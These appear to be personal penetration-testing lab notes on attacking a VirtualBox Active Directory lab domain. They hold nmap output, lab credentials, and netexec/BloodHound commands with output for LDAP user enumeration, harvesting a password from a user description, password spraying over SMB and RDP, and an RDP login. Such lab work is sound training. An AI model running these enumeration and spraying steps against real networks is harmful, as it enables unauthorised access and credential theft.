88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-31 12:00:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53501/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-31T12:02:51
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:40:1a:93 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.7
Host is up (0.039s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=Client-1.hack-academy.local
| Not valid before: 2026-10-30T21:41:15
|_Not valid after:  2027-05-01T21:41:15
5040/tcp  open  unknown
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
49670/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:1d:57 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.9
Host is up (0.024s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-10-31T12:03:47+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=Client-2.hack-academy.local
| Not valid before: 2026-10-30T21:43:12
|_Not valid after:  2027-05-01T21:43:12
| rdp-ntlm-info: 
|   Target_Name: HACK-ACADEMY
|   NetBIOS_Domain_Name: HACK-ACADEMY
|   NetBIOS_Computer_Name: CLIENT-2
|   DNS_Domain_Name: hack-academy.local
|   DNS_Computer_Name: Client-2.hack-academy.local
|   Product_Version: 10.0.19041
|_  System_Time: 2026-10-31T12:03:00+00:00
7680/tcp  open  pando-pub?
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:6c:31:cf (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5s, deviation: 0s, median: 5s
| smb2-time: 
|   date: 2026-10-31T12:03:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 332.62 seconds
                                                                  
```

```
lbennett
!!reiD123

hack-academy.local

10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2
```

COLLECT AD DATA FIRST as `<username>` :
```
bloodhound-python -u 'lbennett' -p '!!reiD123' -d hack-academy.local -ns 10.0.2.4 -c All --zip
```

```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\lbennett:!!reiD123 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 16 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-11-29 14:30:04 12       Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             12       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 12       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             mjohnson                      2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             lbennett                      2025-11-24 01:40:43 0                                                                    
LDAP        10.0.2.4        389    DC01             egreen                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             spatel                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             dreyes                        2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             nflores                       2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             clee                          2025-11-24 01:40:43 12                                                                   
LDAP        10.0.2.4        389    DC01             otran                         2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             zmiller                       2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             mross                         2025-11-24 01:40:44 12                                                                   
LDAP        10.0.2.4        389    DC01             twest                         2025-11-29 15:16:20 0        HappyCactus$10                                              
LDAP        10.0.2.4        389    DC01             eknight                       2025-11-24 01:40:44 0                                                                    
LDAP        10.0.2.4        389    DC01             mthompson                     2025-11-29 14:53:23 3   
```

``
```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users
```

==🔵Anonymous LDAP Username enumeration==
see the DECRIPTION AND USERNAME of all 
==🔴zoom out and print in a line and see the description also==
```
netexec ldap 10.129.95.210 -u '' -p '' --users
```
If you found usernames , put all into a file :
```
netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users | awk '{print $5}' | fgrep -v '[*]' | tee users2.txt
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec ldap 10.0.2.4 -u 'lbennett' -p '!!reiD123' --users | awk '{print $5}' | fgrep -v '[*]' | tee users2.txt
[+]
-Username-
Administrator
Guest
krbtgt
mjohnson
lbennett
egreen
spatel
dreyes
nflores
clee
otran
zmiller
mross
twest
eknight
mthompson

```

#### ==🔵Password Spraying (password reuse : If you have a password of any user and a username list):==

If you have a username list and a single password :
```
nxc smb 10.0.2.4 -d hack-academy.local -u users2.txt -p 'HappyCactus$10' --continue-on-success
```

```
[+] hack-academy.local\twest:HappyCactus$10 
```

```
lbennett
!!reiD123

twest
HappyCactus$10 

hack-academy.local

10.0.2.3      kali 
10.0.2.4      DC01
10.0.2.7      CLIENT-1 
10.0.2.9      CLIENT-2   (RDP allowed)
```


```
netexec smb iplist.txt -u users.txt -p passwords.txt --continue-on-success
```



```
xfreerdp /v:10.0.2.9 /u:twest@'hack-academy.local' /p:'HappyCactus$10' /cert:ignore /dynamic-resolution
```

If you have a username list and a single password (FOR SMB) :
```
netexec smb iplist.txt -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
```

If you have a username list and a single password (FOR RDP) :
```
nxc rdp 10.0.2.7 -d hack-academy.local -u users2.txt -p passwords.txt  --continue-on-success
```

